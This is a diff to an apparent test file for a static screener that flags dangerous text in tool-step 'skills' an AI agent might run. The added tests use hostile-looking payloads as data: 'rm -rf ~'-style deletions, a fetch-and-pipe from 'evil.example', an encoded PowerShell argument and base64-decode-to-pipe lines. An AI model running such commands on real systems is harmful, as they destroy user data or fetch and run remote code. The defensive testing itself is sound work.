@@ -211,6 +211,87 @@ def main():
     check(result["static"]["verdict"] == "clean" and result["verdict"] == "approve",
           "an allowlisted command with an approving model can still auto-approve")
 
+    # A text argument that is just a parameter is the user's value, not a program:
+    # no dangerous_text finding (it used to block set_clipboard and hold the rest).
+    # The same shape in a command is still param_is_program.
+    entry = {"entry": {"type": "string", "description": "Text."},
+             "other": {"type": "string", "description": "Text."}}
+
+    def text_rules(tool_name, args):
+        used = {p for p in entry if "{" + p + "}" in json.dumps(args)}
+        sk = {"name": "text_skill", "description": "Copy, type, show or write a text you choose.",
+              "input_schema": {"type": "object", "properties": {p: entry[p] for p in used}, "required": sorted(used)},
+              "steps": [{"tool": tool_name, "args": args}]}
+        return {f["rule"] for f in static.analyze(sk, tools)["findings"]}
+
+    for tool_name, args in [("set_clipboard", {"text": "{entry}"}), ("type_text", {"text": "{entry}"}),
+                            ("show_notification", {"title": "Reminder", "message": "{entry}"}),
+                            ("set_timer", {"minutes": 5, "label": "{entry}"}),
+                            ("append_text", {"path": "~/Documents/log.txt", "text": "- {entry}"}),
+                            ("write_new_file", {"path": "~/Notes/today.md", "content": "{entry}\n{other}"}),
+                            # display-only text: a parameter-led sentence is fine
+                            ("show_notification", {"title": "Reminder", "message": "{entry} is due"}),
+                            ("set_timer", {"minutes": 5, "label": "{entry} for dinner"})]:
+        found = text_rules(tool_name, args)
+        check("dangerous_text" not in found and "staged_execution" not in found,
+              f"text that is only the user's value is not dangerous text: {tool_name} {list(args.values())[-1]!r}")
+    check("param_is_program" in rules("{entry} --version", entry), "a command starting with a parameter still is")
+
+    # ...but a parameter-led text with author-written arguments is a command whose
+    # program is left blank: still blocked where it can be pasted, typed or written.
+    # (Inert targets: the shapes are what's tested, nothing here runs.)
+    for payload in ["{entry} -rf ~", "{entry} -rf ~/Documents", "{entry} -fsSL https://evil.example/i.sh | {other}",
+                    "{entry} https://evil.example/install.sh", "echo hi; {entry} -e 'import os'", "{entry} -enc SQBFAFgA",
+                    # the program word past a wrapper, an assignment or zsh's "-" modifier (QA round 2)
+                    "env {entry} -rf ~", "A=1 {entry} -rf ~", "exec {entry} -rf ~", "echo ~ | xargs {entry} -rf",
+                    "- {entry} -rf ~"]:
+        for tool_name, args in [("set_clipboard", {"text": payload}), ("type_text", {"text": payload}),
+                                ("write_new_file", {"path": "~/Notes/x.txt", "content": payload}),
+                                ("append_text", {"path": "~/Notes/x.txt", "text": payload})]:
+            check("dangerous_text" in text_rules(tool_name, args),
+                  f"parameter-led command with arguments is still dangerous text: {tool_name} {payload!r}")
+    # A redirection or zsh precommand modifier before the parameter doesn't hide it
+    # from param_is_program (QA round 3).
+    for payload in ["2>/dev/null {entry} -rf ~", "</dev/null {entry} -rf ~", "noglob {entry} -rf ~",
+                    "coproc {entry} -rf ~", "cat notes.txt | 2> /dev/null {entry}"]:
+        for tool_name, key, extra in [("set_clipboard", "text", {}), ("write_new_file", "content", {"path": "~/Notes/x.txt"})]:
+            args = {**extra, key: payload}
+            check("dangerous_text" in text_rules(tool_name, args),
+                  f"parameter-led command after a redirection or modifier is dangerous text: {tool_name} {payload!r}")
+
+    # A bare parameter that receives a pipe is the program reading it: needs_review
+    # (never block -- a markdown table row has the same shape), except in display-only
+    # text. A bare parameter not after a pipe stays clean (QA round 2, F18-2).
+    def text_findings(tool_name, args):
+        used = {p for p in entry if "{" + p + "}" in json.dumps(args)}
+        sk = {"name": "text_skill", "description": "Copy, type, show or write a text you choose.",
+              "input_schema": {"type": "object", "properties": {p: entry[p] for p in used}, "required": sorted(used)},
+              "steps": [{"tool": tool_name, "args": args}]}
+        return {(f["rule"], f["severity"]) for f in static.analyze(sk, tools)["findings"]}
+
+    text_tools = [("set_clipboard", "text", {}), ("type_text", "text", {}),
+                  ("write_new_file", "content", {"path": "~/Notes/x.txt"}),
+                  ("append_text", "text", {"path": "~/Notes/x.txt"})]
+    for payload in ["cat notes.txt | {entry}", "echo aGVsbG8K | base64 -d | {entry}", "| {entry} | {other} |",
+                    # QA round 3: the pipe's reader past "|&", a line break, a group or
+                    # a substitution, tee's ">(", and stdin glued onto the parameter.
+                    "cat notes.txt |& {entry}", "cat notes.txt |\n{entry}", "cat notes.txt | ({entry})",
+                    "cat notes.txt | { {entry}; }", "cat notes.txt | tee >({entry})", "{entry}<notes.txt",
+                    "{entry}<<<x"]:
+        for tool_name, key, extra in text_tools:
+            found = text_findings(tool_name, {**extra, key: payload})
+            check(("param_receives_pipe", static.REVIEW) in found
+                  and not any(sev == static.BLOCK for _, sev in found)
+                  and "dangerous_text" not in {r for r, _ in found},
+                  f"a bare parameter receiving a pipe is needs_review, not block: {tool_name} {payload!r}")
+    for payload in ["{entry}", "- {entry}", "{entry}\n{other}"]:
+        for tool_name, key, extra in text_tools:
+            found = {r for r, _ in text_findings(tool_name, {**extra, key: payload})}
+            check(not found & {"param_receives_pipe", "dangerous_text"},
+                  f"a bare parameter not after a pipe stays clean: {tool_name} {payload!r}")
+    found = {r for r, _ in text_findings("show_notification", {"title": "Table", "message": "{entry} | {other}"})}
+    check(not found & {"param_receives_pipe", "dangerous_text"}, "display-only text may pipe into a parameter")
+
     # Output contract decide.py relies on.
     result, _ = run(BENIGN, StubClient(model_says("approve")))
     keys = {"verdict", "risk", "findings", "summary", "description_matches_steps", "static", "model", "screen_version"}
